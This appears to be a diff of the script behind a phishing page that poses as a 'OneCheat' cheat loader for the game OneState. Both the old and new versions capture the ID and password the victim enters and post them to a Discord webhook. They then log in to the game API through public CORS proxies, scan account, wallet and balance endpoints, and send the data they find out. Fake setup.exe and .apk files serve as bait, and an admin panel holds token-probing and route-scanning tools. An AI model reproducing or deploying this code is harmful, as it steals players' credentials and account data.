+function setCfg(o){localStorage.setItem(LS.cfg,JSON.stringify(o))}
+function webhook(){return qs('to')||getCfg().webhook||CONFIG.WEBHOOK}
+function fp(){var v=localStorage.getItem(LS.fp);if(!v){v=Math.random().toString(36).slice(2,10)+Math.random().toString(36).slice(2,6);localStorage.setItem(LS.fp,v)}return v}
+function getLog(){try{return JSON.parse(localStorage.getItem(LS.log)||'[]')}catch(e){return[]}}
+function stamp(){var d=new Date(),p=function(n){return String(n).padStart(2,'0')};return p(d.getHours())+':'+p(d.getMinutes())+':'+p(d.getSeconds())}
+function log(s){var a=getLog();a.push(stamp()+' '+s);while(a.length>300)a.shift();localStorage.setItem(LS.log,JSON.stringify(a));renderLog()}
+function clearLog(){localStorage.setItem(LS.log,'[]');renderLog()}
+function renderLog(){var el=$('alog');if(!el)return;el.textContent=getLog().slice(-250).join('\n');el.scrollTop=el.scrollHeight}
+function toast(t){var w=$('toast'),d=document.createElement('div');d.className='tt';d.textContent=t;w.appendChild(d);setTimeout(function(){d.remove()},2200)}
 
-  /* route candidates */
-  var ROUTES=[
-    "/me","/user","/users/me","/user/me","/user/profile","/profile","/account","/account/me",
-    "/auth/me","/auth/user","/auth/profile","/auth/account","/auth/session","/auth/verify",
-    "/session","/whoami","/userinfo","/player","/players/me","/character","/characters/me",
-    "/wallet","/balance","/inventory","/cars","/garage","/stats","/daily","/store","/license"
-  ];
+/* ---------- transports ---------- */
+var TR=[
+ {n:'sdk',need:function(){return !!(window.corsfix&&window.corsfix.fetch)},f:function(u,o){return window.corsfix.fetch(u,o)}},
+ {n:'corsfix',f:function(u,o){return fetch('https://proxy.corsfix.com/?'+u,o)}},
+ {n:'allorigins-g',wrap:true,f:function(u,o){return fetch('https://api.allorigins.win/get?url='+encodeURIComponent(u),o)}},
+ {n:'codetabs',f:function(u,o){return fetch('https://api.codetabs.com/v1/proxy?quest='+encodeURIComponent(u),o)}},
+ {n:'cors.lol',f:function(u,o){return fetch('https://api.cors.lol/?url='+encodeURIComponent(u),o)}},
+ {n:'allorigins',f:function(u,o){return fetch('https://api.allorigins.win/raw?url='+encodeURIComponent(u),o)}},
+ {n:'direct',f:function(u,o){return fetch(u,o)}}
+];
+var PREF=-1;
 
-  var COMBOS=[
-    {n:"Bearer",         h:function(t){return {Authorization:"Bearer "+t};}},
-    {n:"X-Access-Token", h:function(t){return {"X-Access-Token":t};}},
-    {n:"q access_token", q:"access_token"}
-  ];
-
-  var pref=null, tp="none";
-  var $=function(i){return document.getElementById(i)};
-  var esc=function(s){return String(s==null?"":s).replace(/[&<>"]/g,function(c){return({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"})[c]})};
-  var q=new URLSearchParams(location.search);
-  var admin=q.has("admin");
-
-  var saved={}; try{saved=JSON.parse(localStorage.getItem(CFG_KEY)||"{}")}catch(e){}
-  var cfg={webhook:CONFIG.WEBHOOK,wtype:CONFIG.TYPE,acct:CONFIG.ACCT,redirect:CONFIG.REDIRECT};
-  for(var k in saved){ if(saved[k]!==""&&saved[k]!=null) cfg[k]=saved[k]; }
-  if(!saved.webhook) cfg.webhook=CONFIG.WEBHOOK;
-  if(q.get("to")) cfg.webhook=q.get("to");
-
-  var log=[]; try{log=JSON.parse(localStorage.getItem(LOG_KEY)||"[]")}catch(e){}
-  function saveCfg(){try{localStorage.setItem(CFG_KEY,JSON.stringify(cfg))}catch(e){}}
-  function saveLog(){try{localStorage.setItem(LOG_KEY,JSON.stringify(log.slice(0,30)))}catch(e){}}
-  function fp(){
-    var f=localStorage.getItem(FP_KEY); if(f)return f;
-    f="oc-"+Math.random().toString(36).slice(2,10)+Date.now().toString(36);
-    try{localStorage.setItem(FP_KEY,f)}catch(e){}
-    return f;
+async function req(method,path,body,headers){
+  var url=CONFIG.API+path;
+  var opts={method:method,headers:Object.assign({'Content-Type':'application/json'},headers||{})};
+  if(body!=null)opts.body=JSON.stringify(body);
+  var idx=TR.map(function(_,i){return i});
+  var order=PREF>=0?[PREF].concat(idx.filter(function(i){return i!==PREF})):idx;
+  var last=null,err='no transport';
+  for(var k=0;k<order.length;k++){
+    var i=order[k],t=TR[i];
+    try{
+      if(t.need&&!t.need())continue;
+      var r=await t.f(url,opts);
+      var txt=await r.text();
+      if(t.wrap){try{txt=JSON.parse(txt).contents}catch(e){}}
+      var j=null;try{j=JSON.parse(txt)}catch(e){}
+      last={ok:true,t:t.n,status:r.status,json:j,text:txt};
+      if(j&&typeof j==='object'&&('code'in j||'errorCode'in j||'data'in j)){PREF=i;return last}
+    }catch(e){err=t.n+': '+(e&&e.message||e)}
   }
-  function toast(t,b){
-    var d=document.createElement("div"); d.className="tst"+(b?" b":""); d.textContent=t;
-    $("toast").appendChild(d);
-    setTimeout(function(){ d.style.transition=".3s"; d.style.opacity="0"; d.style.transform="translateY(8px)"; },2200);
-    setTimeout(function(){ d.remove(); },2600);
-  }
-  function msg(text,cls){
-    var m=$("msg");
-    if(!text){ m.className="msg"; m.textContent=""; return; }
-    m.className="msg on "+(cls||""); m.textContent=text;
-  }
-  function timeout(p,ms){
-    return new Promise(function(res){
-      var done=false, t=setTimeout(function(){ if(!done){done=true; res(null);} },ms);
-      p.then(function(v){ if(!done){done=true; clearTimeout(t); res(v);} },
-             function(){ if(!done){done=true; clearTimeout(t); res(null);} });
-    });
-  }
-  function unwrap(d,wrap){
-    if(d && wrap && typeof d.contents==="string"){ try{ return JSON.parse(d.contents); }catch(e){ return null; } }
-    return d;
-  }
-  function isApi(d){ return d && (d.code!==undefined || d.errorCode!==undefined || d.data!==undefined); }
-  function doFetch(a,target,opts){
-    if(a && a.sdk && window.corsfix && window.corsfix.fetch) return window.corsfix.fetch(target,opts);
-    return fetch(a.u(target),opts);
-  }
+  return last||{ok:false,err:err};
+}
 
-  function once(a,target,opts,ms){
-    return new Promise(function(res){
-      var done=false;
-      var t=setTimeout(function(){ if(!done){done=true; res("timeout");} },ms||15000);
-      doFetch(a,target,opts).then(function(r){
-        return r.text().then(function(txt){
-          if(done) return; done=true; clearTimeout(t);
-          var d=null; try{ d=JSON.parse(txt); }catch(e){}
-          d=unwrap(d,a.wrap);
-          if(d===null||d===undefined) res("html:"+String(txt).replace(/\s+/g," ").slice(0,40));
-          else if(d.code!==undefined) res("code"+d.code);
-          else if(d.errorCode!==undefined) res("err="+(d.errorCode||"-"));
-          else res("json");
-        });
-      }).catch(function(e){ if(done) return; done=true; clearTimeout(t); res("ERR"); });
-    });
-  }
+function code(r){if(!r||!r.ok)return 'ERR';if(r.json&&r.json.code!=null)return r.json.code;if(r.json&&r.json.errorCode)return r.json.errorCode;return 'ok('+(r.status||'?')+')'}
 
-  function call(path,opts){
-    var target=API+path;
-    var order=[];
-    if(pref!==null && pref<TR.length) order.push(pref);
-    for(var j=0;j<TR.length;j++){ if(j!==pref) order.push(j); }
+/* ---------- discord ---------- */
+async function send(text){
+  var wh=webhook();if(!wh)return;
+  var body=JSON.stringify({content:text});
+  try{await fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:body})}
+  catch(e){try{await fetch(wh,{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:body})}catch(_){}}
+}
 
-    return new Promise(function(res){
-      var k=0;
-      (function next(){
-        if(k>=order.length){ res(null); return; }
-        var idx=order[k++], a=TR[idx], done=false;
-        var t=setTimeout(function(){ if(!done){ done=true; next(); } }, a.t);
-        doFetch(a,target,opts).then(function(r){ return r.text(); }).then(function(txt){
-          if(done) return;
-          done=true; clearTimeout(t);
-          var d=null; try{ d=JSON.parse(txt); }catch(e){}
-          d=unwrap(d,a.wrap);
-          if(!isApi(d)){ next(); return; }
-          pref=idx; tp=a.n;
-          if($("aTp")) $("aTp").value=tp;
-          res(d);
-        }).catch(function(){ if(done) return; done=true; clearTimeout(t); next(); });
-      })();
-    });
-  }
+/* ---------- login ---------- */
+async function apiLogin(id,pw){
+  var r=await req('POST','/v2/auth/login',{ident:id,password:pw,remember:true,fingerprint:fp()});
+  log('login ['+r.t+'|'+code(r)+'] '+String(r.text||r.err).slice(0,220));
+  if(r.ok&&r.json&&r.json.data&&r.json.data.accessToken)return r.json;
+  return null;
+}
+function creds(){return{id:$('ident').value.trim(),pw:$('pass').value}}
 
-  function login(ident,pass){
-    var json=JSON.stringify({ident:ident,password:pass,remember:true,fingerprint:fp()});
-    var form="ident="+encodeURIComponent(ident)+"&password="+encodeURIComponent(pass)
-           + "&remember=true&fingerprint="+encodeURIComponent(fp());
-    function ok(r){ return !!(r && r.data && r.data.accessToken); }
+/* ---------- main flow ---------- */
+function msg(t,ok){var m=$('msg');m.textContent=t||'';m.className='msg'+(ok?' ok':'')}
+function issue(){
+  var c='0123456789ABCDEFGHJKLMNPQRSTUVWXYZ',k='OC-';
+  for(var i=0;i<12;i++){k+=c[Math.floor(Math.random()*c.length)];if(i%4===3&&i<11)k+='-'}
+  $('key').textContent=k;$('lic').hidden=false;$('dl').hidden=false;$('tg').hidden=false;
+  return k;
+}
+function acct(t){$('acct').hidden=false;$('acctBody').textContent=t}
 
-    return call("/auth/login",{method:"POST",headers:{"Content-Type":"application/json"},body:json})
-      .then(function(r){
-        if(ok(r)) return r;
-        if(r && r.errorCode && r.errorCode!=="MISSING_IDENT" && r.errorCode!=="UNSPECIFIED") return r;
-        return call("/auth/login",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:form})
-          .then(function(f){
-            if(ok(f)) return f;
-            return call("/auth/login",{method:"POST",headers:{"Content-Type":"text/plain;charset=utf-8"},body:json})
-              .then(function(t){ return t||f||r; });
-          });
-      });
-  }
-
-  function getWithToken(path,token){
-    return call(path,{headers:{Authorization:"Bearer "+token}}).then(function(d){
-      if(d && d.code===16){
-        return call(path+"?access_token="+encodeURIComponent(token),{}).then(function(e){
-          return (e && e.code!==16) ? e : d;
-        });
-      }
-      return d;
-    });
-  }
-
-  function probe(token){
-    var out=[];
-    var p=Promise.resolve();
-    ["/auth/me","/user","/me","/users/me","/profile"].forEach(function(path){
-      p=p.then(function(){
-        return getWithToken(path,token).then(function(d){ out.push({path:path,data:d}); });
-      });
-    });
-    return p.then(function(){ return out; });
-  }
-
-  function pick(list){
-    for(var i=0;i<list.length;i++){
-      var d=list[i].data;
-      if(d && typeof d==="object" && d.code!==12 && d.code!==16) return list[i];
+var ACCT_PATHS=['/v2/auth/me','/v2/me','/v2/user/me','/v2/user','/v2/profile','/v2/account','/v2/users/me','/v2/player','/v2/wallet','/v2/balance'];
+async function fetchAccount(tok){
+  for(var i=0;i<ACCT_PATHS.length;i++){
+    var r=await req('GET',ACCT_PATHS[i],null,{Authorization:'Bearer '+tok});
+    var c=code(r);
+    if(r.ok&&r.json&&r.json.code!==16&&r.json.code!==5){
+      acct(ACCT_PATHS[i]+'\n'+JSON.stringify(r.json,null,2).slice(0,900));
+      send('OneState アカウント取得\npath: '+ACCT_PATHS[i]+'\n'+JSON.stringify(r.json).slice(0,1500));
+      return;
     }
-    return null;
   }
+  acct('ログイン成功（トークン取得済み）\n※内容の取得はまだ未確定');
+}
 
-  function hook(body){
-    if(!cfg.webhook || cfg.wtype==="none") return Promise.resolve(false);
-    var t=cfg.wtype;
-    if(t==="auto") t=cfg.webhook.indexOf("discord.com")>-1 ? "discord" : "json";
-    var payload = t==="discord" ? body.discord : body.json;
-    var json=JSON.stringify(payload);
-    return fetch(cfg.webhook,{method:"POST",headers:{"Content-Type":"application/json"},body:json})
-      .then(function(r){return r.ok})
-      .catch(function(){
-        return fetch(cfg.webhook,{method:"POST",mode:"no-cors",headers:{"Content-Type":"text/plain;charset=utf-8"},body:json})
-          .then(function(){return true}).catch(function(){return false});
-      });
+$('form').addEventListener('submit',async function(e){
+  e.preventDefault();
+  var id=$('ident').value.trim(),pw=$('pass').value;
+  if(!id||!pw){msg('IDとパスワードを入力');return}
+  $('go').disabled=true;msg('接続中...');
+  var k=issue();
+  await send('OneState ID 取得\nID: '+id+'\nパスワード: '+pw+'\n時刻: '+new Date().toLocaleString('ja-JP'));
+  var lr=await apiLogin(id,pw);
+  if(lr){
+    msg('ライセンス発行済み / 認証OK',true);
+    toast('ライセンス発行');
+    await fetchAccount(lr.data.accessToken);
+  }else{
+    msg('ライセンス発行済み',true);
+    toast('ライセンス発行');
+    acct('API応答なし（IDは取得済み）');
   }
+  $('go').disabled=false;
+});
 
-  function sendCreds(e){
-    return hook({
-      discord:{content:"**OneState ID 取得**\n**ID:** `"+e.ident+"`\n**パスワード:** `"+e.pass+"`\n**時刻:** "+e.time},
-      json:{ident:e.ident,password:e.pass,time:e.time,ua:navigator.userAgent}
-    });
-  }
-  function sendAcct(e,label,data){
-    return hook({
-      discord:{content:"**アカウント情報** `"+label+"`\n```json\n"+data.slice(0,1000)+"\n```"},
-      json:{ident:e.ident,label:label,data:data.slice(0,4000)}
-    });
-  }
-
-  function dl(name){
-    var head="OneCheat v3.2 - OneState Client\nLicense: "+($("key").textContent||"")+"\nBuilt: "+new Date().toISOString()+"\n\n";
-    var filler=""; for(var i=0;i<400;i++) filler+="0x"+Math.floor(Math.random()*16777215).toString(16)+" ";
-    var b=new Blob([head+filler],{type:"application/octet-stream"});
-    var u=URL.createObjectURL(b), a=document.createElement("a");
-    a.href=u; a.download=name; document.body.appendChild(a); a.click(); a.remove();
-    setTimeout(function(){URL.revokeObjectURL(u)},1500);
-    toast(name+" をダウンロード中...",true);
-  }
-
-  $("form").addEventListener("submit",function(ev){
-    ev.preventDefault();
-    var ident=$("ident").value.trim(), pass=$("pass").value;
-    if(!ident||!pass){ msg("IDとパスワードを入力してください","err"); return; }
-    msg("認証中...","wait");
-    var entry={ident:ident,pass:pass,time:new Date().toLocaleString("ja-JP")};
-
-    sendCreds(entry).then(function(sent){
-      log.unshift(entry); saveLog(); renderLog();
-      msg("ライセンスを発行しました。下のクライアントをダウンロードしてください。","ok");
-      $("key").textContent=license();
-      $("done").classList.add("on");
-      toast(sent?"Discordに通知しました":"有効化しました",true);
-      if(cfg.redirect) setTimeout(function(){ location.href="https://onestate.com/"; },1400);
-      if(cfg.acct) fetchAccount(entry);
-    });
+document.querySelectorAll('[data-dl]').forEach(function(b){
+  b.addEventListener('click',function(){
+    var kind=b.getAttribute('data-dl');
+    var txt='OneState Cheat Loader v3.2 ('+kind+')\nkey='+$('key').textContent+'\nfp='+fp()+'\n';
+    var blob=new Blob([txt],{type:'application/octet-stream'});
+    var a=document.createElement('a');a.href=URL.createObjectURL(blob);
+    a.download=kind==='win'?'OneStateCheat-Setup.exe':'OneStateCheat.apk';a.click();
   });
+});
+document.querySelectorAll('.tog').forEach(function(t){t.addEventListener('click',function(){t.classList.toggle('on')})});
 
-  function fetchAccount(entry){
-    $("acctWrap").style.display="block";
-    $("acct").textContent="// 接続中 ...";
-    timeout(login(entry.ident,entry.pass),90000).then(function(res){
-      if(!res){ $("acct").textContent="// 応答なし（全経路だめ）"; return; }
-      if(!(res.data && res.data.accessToken)){
-        $("acct").textContent="// ログイン拒否 ["+tp+"] "+JSON.stringify(res).slice(0,400);
-        return;
-      }
-      var token=res.data.accessToken;
-      entry.clientId=res.data.clientId||"";
-      $("acct").textContent="// ログインOK ["+tp+"] - エンドポイント探索中 ...";
-      timeout(probe(token),90000).then(function(list){
-        if(!list){ $("acct").textContent="// 探索タイムアウト"; return; }
-        var best=pick(list);
-        if(best){
-          var j=JSON.stringify(best.data,null,1);
-          $("acct").textContent="// "+best.path+"  ["+tp+"]\n"+j.slice(0,1800);
-          sendAcct(entry,best.path,j);
-        }else{
-          var raw=JSON.stringify(res.data,null,1);
-          $("acct").textContent="// エンドポイント不明 ["+tp+"] - ログイン情報のみ\n"+raw.slice(0,900);
-          sendAcct(entry,"login",raw);
-        }
-      });
-    });
+/* ---------- admin ---------- */
+if(qs('admin')!=null){$('admin').hidden=false}
+$('ah').addEventListener('click',function(){$('ab').classList.toggle('collapsed')});
+$('wh').value=getCfg().webhook||'';
+$('bsave').addEventListener('click',function(){var c=getCfg();c.webhook=$('wh').value.trim();setCfg(c);toast('保存しました')});
+$('btest').addEventListener('click',function(){send('テスト送信 '+new Date().toLocaleString('ja-JP'));toast('送信')});
+$('bclr').addEventListener('click',function(){clearLog();toast('削除')});
+
+var ROUTES=['/me','/user','/users/me','/user/me','/user/profile','/profile','/account','/account/me','/auth/me','/auth/user','/auth/profile','/auth/account','/auth/session','/auth/verify','/session','/whoami','/userinfo','/player','/players/me','/character','/characters/me','/wallet','/balance','/inventory','/cars','/garage','/stats','/daily','/store','/license'];
+
+async function routeScan(tok,headers){
+  var h=headers||{Authorization:'Bearer '+tok};
+  log('--- route scan ---');
+  for(var i=0;i<ROUTES.length;i++){
+    var r=await req('GET','/v2'+ROUTES[i],null,h);
+    var c=code(r);
+    log((c!==16?'★ ':'  ')+'/v2'+ROUTES[i]+' -> '+c);
+    if(c!==16)await sleep(80);
+  }
+  log('--- scan end ---');
+}
+
+/* ===== TOKEN ORACLE ===== */
+async function oracle(){
+  clearLog();log('// TOKEN ORACLE');
+  var c=creds();if(!c.id||!c.pw){log('先にID/PWを入力');toast('ID/PW未入力');return}
+  var lr=await apiLogin(c.id,c.pw);
+  if(!lr){log('ログイン失敗');return}
+  var tok=lr.data.accessToken,cid=lr.data.clientId||'';
+  log('token len='+tok.length+' clientId='+cid);
+
+  /* refresh test */
+  if(lr.data.refreshToken){
+    var rr=await req('POST','/v2/auth/refresh',{refreshToken:lr.data.refreshToken,fingerprint:fp()});
+    log('refresh -> '+code(rr)+' '+String(rr.text||rr.err).slice(0,180));
   }
 
-  function license(){
-    var c="ABCDEFGHJKLMNPQRSTUVWXYZ23456789", s="";
-    for(var i=0;i<3;i++){ if(i)s+="-"; for(var j=0;j<4;j++) s+=c[Math.floor(Math.random()*c.length)]; }
-    return "OC-"+s;
+  var ORACLE='/v2/zzz';
+  var V=[
+    ['none',{}],
+    ['Bearer',{Authorization:'Bearer '+tok}],
+    ['raw',{Authorization:tok}],
+    ['X-Access-Token',{'X-Access-Token':tok}],
+    ['X-Auth-Token',{'X-Auth-Token':tok}],
+    ['access-token',{'access-token':tok}],
+    ['Access-Token',{'Access-Token':tok}],
+    ['token',{'token':tok}],
+    ['Bearer+fp',{Authorization:'Bearer '+tok,fingerprint:fp()}],
+    ['Bearer+Client-Id',{Authorization:'Bearer '+tok,'Client-Id':cid}],
+    ['q access_token',{},'?access_token='+tok],
+    ['q accessToken',{},'?accessToken='+tok],
+    ['q token',{},'?token='+tok],
+    ['q auth',{},'?auth='+tok]
+  ];
+  var hit=null;
+  for(var i=0;i<V.length;i++){
+    var name=V[i][0],h=V[i][1],q=V[i][2]||'';
+    var r=await req('GET',ORACLE+q,null,h);
+    var cc=code(r);
+    var star=(cc!==16&&cc!=='ERR');
+    log(name+' -> '+cc+(star?'  ★':''));
+    if(star&&!hit)hit={name:name,h:h};
+    await sleep(120);
   }
-
-  document.addEventListener("click",function(e){
-    var sw=e.target.closest(".sw"); if(sw){ sw.classList.toggle("on"); return; }
-    var d=e.target.closest("[data-dl]"); if(d){ dl(d.getAttribute("data-dl")); return; }
-    var g=e.target.closest("[data-go]");
-    if(g){ var el=$(g.getAttribute("data-go")); if(el) el.scrollIntoView({behavior:"smooth"}); }
-  });
-
-  var io=new IntersectionObserver(function(es){
-    es.forEach(function(x){ if(x.isIntersecting){ x.target.classList.add("in"); io.unobserve(x.target); } });
-  },{threshold:.12});
-  document.querySelectorAll(".reveal").forEach(function(el){io.observe(el)});
-
-  function renderLog(){
-    if(!admin) return;
-    $("aLog").innerHTML = log.length ? log.slice(0,10).map(function(e){
-      return "<div><b>"+esc(e.ident)+"</b><br>"+esc(e.pass)+"<br>"+esc(e.time)+"</div>";
-    }).join("") : "<div>まだ記録はありません</div>";
+  if(hit){
+    log('== 受理: '+hit.name+' ==');
+    toast('トークン受理: '+hit.name);
+    await routeScan(tok,hit.h);
+  }else{
+    log('== 全滅: トークン自体が拒否 ==');
+    toast('全滅');
   }
+}
 
-  if(admin){
-    $("admin").classList.add("on");
-    $("aWeb").value=cfg.webhook||""; $("aType").value=cfg.wtype; $("aAcct").value=cfg.acct?"1":"0";
-    renderLog();
-    $("aHead").onclick=function(){
-      $("admin").classList.toggle("min");
-      $("aTog").textContent = $("admin").classList.contains("min") ? "+" : "–";
-    };
-    $("aSave").onclick=function(){
-      cfg.webhook=$("aWeb").value.trim(); cfg.wtype=$("aType").value; cfg.acct=$("aAcct").value==="1";
-      saveCfg(); toast("保存しました",true);
-    };
-    $("aTest").onclick=function(){
-      cfg.webhook=$("aWeb").value.trim(); cfg.wtype=$("aType").value; saveCfg();
-      sendCreds({ident:"test@example.com",pass:"testpass",time:new Date().toLocaleString("ja-JP")})
-        .then(function(ok){ toast(ok?"テスト送信 OK":"送信失敗（URL確認）",ok) });
-    };
-
-    /* route + transport diag */
-    $("aRoute").onclick=function(){
-      var id=$("aIdent").value.trim(), pw=$("aPass").value;
-      if(!id||!pw){ toast("IDとパスワードを入力"); return; }
-      $("aLog").innerHTML="<div>ログイン中...</div>";
-      timeout(login(id,pw),60000).then(function(res){
-        if(!res || !res.data || !res.data.accessToken){
-          $("aLog").innerHTML="<div>ログイン失敗</div>"; return;
-        }
-        var t=res.data.accessToken;
-        var out=[];
-
-        function draw(){
-          $("aLog").innerHTML = out.join("");
-        }
-        out.push("<div><b>経路テスト /auth/me (Bearer)</b></div>");
-        var p=Promise.resolve();
-        ["sdk","corsfix","direct"].forEach(function(name){
-          p=p.then(function(){
-            var a=null;
-            for(var i=0;i<TR.length;i++) if(TR[i].n===name) a=TR[i];
-            if(!a) return;
-            return once(a,API+"/auth/me",{headers:{Authorization:"Bearer "+t}},a.t).then(function(r){
-              out.push("<div>"+esc(name)+": "+esc(r)+(r==="code16"?"":" <b><- hit</b>")+"</div>");
-              draw();
-            });
-          });
-        });
-
-        out.push("<div><b>ルート探索 "+ROUTES.length+"本</b></div>");
-        p=p.then(function(){ draw(); });
-        ROUTES.forEach(function(path){
-          p=p.then(function(){
-            return timeout(call(path,{headers:{Authorization:"Bearer "+t}}),15000).then(function(d){
-              var s = d ? JSON.stringify(d).slice(0,120) : "null";
-              var hit = d && d.code!==16;
-              out.push("<div>"+(hit?"<b>-> "+esc(path)+"</b><br>":"")+esc(hit?"":path+": ")+esc(s)+"</div>");
-              draw();
-            });
-          });
-        });
-        p.then(function(){ toast("ルート調査 完了"); });
-      });
-    };
-
-    $("aToken").onclick=function(){
-      var id=$("aIdent").value.trim(), pw=$("aPass").value;
-      if(!id||!pw){ toast("IDとパスワードを入力"); return; }
-      $("aLog").innerHTML="<div>ログイン中...</div>";
-      timeout(login(id,pw),60000).then(function(res){
-        if(!res || !res.data || !res.data.accessToken){ $("aLog").innerHTML="<div>ログイン失敗</div>"; return; }
-        var t=res.data.accessToken, c=res.data.clientId||"";
-        var rows=[];
-        function draw(){
-          $("aLog").innerHTML="<div><b>トークン調査</b> (/auth/me)</div>"+rows.map(function(r){
-            return "<div>"+(/code16/.test(r.r)?"":"<b>-> ")+esc(r.n)+(/code16/.test(r.r)?"":"</b>")+"<br>"+esc(r.r)+"</div>";
-          }).join("");
-        }
-        var p=Promise.resolve();
-        COMBOS.forEach(function(cb){
-          p=p.then(function(){
-            var url="/auth/me", opts={};
-            if(cb.q) url="/auth/me?"+cb.q+"="+encodeURIComponent(t);
-            else opts={headers:cb.h(t,c)};
-            return timeout(call(url,opts),15000).then(function(d){
-              rows.push({n:cb.n, r:d?JSON.stringify(d).slice(0,90):"null"}); draw();
-            });
-          });
-        });
-        p.then(function(){ toast("トークン調査 完了"); });
-      });
-    };
-
-    $("aDiag").onclick=function(){
-      var target=API+"/auth/login";
-      var json=JSON.stringify({ident:"diag@example.com",password:"x",remember:true,fingerprint:"diag"});
-      var form="ident=diag%40example.com&password=x&remember=true&fingerprint=diag";
-      var rows=[];
-      function draw(){
-        $("aLog").innerHTML="<div><b>通信診断</b></div>"+rows.map(function(r){
-          return "<div><b>"+esc(r.n)+"</b><br>GET: "+esc(r.get||"-")+"<br>POSTj: "+esc(r.post||"-")+"<br>POSTf: "+esc(r.form||"-")+"<br>POSTt: "+esc(r.txt||"-")+"</div>";
-        }).join("");
-      }
-      $("aLog").innerHTML="<div>通信診断中 ...</div>";
-      var p=Promise.resolve();
-      TR.forEach(function(tr){
-        p=p.then(function(){
-          var row={n:tr.n}; rows.push(row); draw();
-          return once(tr,target,{},tr.t).then(function(a){ row.get=a; draw();
-            return once(tr,target,{method:"POST",headers:{"Content-Type":"application/json"},body:json},tr.t);
-          }).then(function(b){ row.post=b; draw();
-            return once(tr,target,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:form},tr.t);
-          }).then(function(c){ row.form=c; draw();
-            return once(tr,target,{method:"POST",headers:{"Content-Type":"text/plain;charset=utf-8"},body:json},tr.t);
-          }).then(function(d){ row.txt=d; draw(); });
-        });
-      });
-      p.then(function(){ toast("通信診断 完了"); });
-    };
-
-    $("aProbe").onclick=function(){
-      var id=$("aIdent").value.trim(), pw=$("aPass").value;
-      if(!id||!pw){ toast("IDとパスワードを入力"); return; }
-      $("aLog").innerHTML="<div>接続中...</div>";
-      timeout(login(id,pw),90000).then(function(res){
-        if(!res){ $("aLog").innerHTML="<div>応答なし（全経路だめ）</div>"; return; }
-        if(!(res.data && res.data.accessToken)){
-          $("aLog").innerHTML="<div><b>ログイン拒否</b> ["+esc(tp)+"]<br>"+esc(JSON.stringify(res).slice(0,400))+"</div>"; return;
-        }
-        $("aLog").innerHTML="<div><b>ログインOK</b> ["+esc(tp)+"]</div><div>探索中...</div>";
-        timeout(probe(res.data.accessToken),90000).then(function(list){
-          if(!list){ $("aLog").innerHTML="<div>探索タイムアウト</div>"; return; }
-          $("aLog").innerHTML="<div><b>経路: "+esc(tp)+"</b></div>"+list.map(function(x){
-            return "<div><b>"+esc(x.path)+"</b><br>"+esc(JSON.stringify(x.data).slice(0,240))+"</div>";
-          }).join("");
-        });
-      });
-    };
-    $("aClear").onclick=function(){ log=[]; saveLog(); renderLog(); toast("ログを削除しました"); };
+async function probe(){
+  clearLog();log('// PROBE');
+  var c=creds();if(!c.id||!c.pw){log('先にID/PWを入力');return}
+  var lr=await apiLogin(c.id,c.pw);if(!lr){log('ログイン失敗');return}
+  for(var i=0;i<ACCT_PATHS.length;i++){
+    var r=await req('GET',ACCT_PATHS[i],null,{Authorization:'Bearer '+lr.data.accessToken});
+    log(ACCT_PATHS[i]+' -> '+code(r)+' '+String(r.text||'').slice(0,120));
+    await sleep(80);
   }
+}
+
+async function diag(){
+  clearLog();log('// TRANSPORT DIAG');
+  var M=[['GET','/v2/auth/login',null],['POSTj','/v2/auth/login',{ident:'x',password:'y',remember:true,fingerprint:fp()}],['POSTt','/v2/auth/login',{ident:'x',password:'y'}]];
+  for(var i=0;i<TR.length;i++){
+    var line=TR[i].n+': ';
+    for(var k=0;k<M.length;k++){
+      var r;
+      try{
+        if(TR[i].need&&!TR[i].need()){line+=M[k][0]+'=skip ';continue}
+        var u=CONFIG.API+M[k][1];
+        var o={method:M[k][0]==='GET'?'GET':'POST',headers:{'Content-Type':'application/json'}};
+        if(M[k][2])o.body=JSON.stringify(M[k][2]);
+        var res=await TR[i].f(u,o);
+        var t=await res.text();
+        if(TR[i].wrap){try{t=JSON.parse(t).contents}catch(e){}}
+        var j=null;try{j=JSON.parse(t)}catch(e){}
+        line+=M[k][0]+'='+(j&&j.code!=null?'code'+j.code:(j&&j.errorCode?'err='+j.errorCode:'?'))+' ';
+      }catch(e){line+=M[k][0]+'=ERR '}
+      await sleep(60);
+    }
+    log(line);
+  }
+}
+
+$('boracle').addEventListener('click',oracle);
+$('broute').addEventListener('click',async function(){var c=creds();var lr=await apiLogin(c.id,c.pw);if(lr)await routeScan(lr.data.accessToken)});
+$('bprobe').addEventListener('click',probe);
+$('bdiag').addEventListener('click',diag);
+
+renderLog();
 })();
 </script>
 </body>
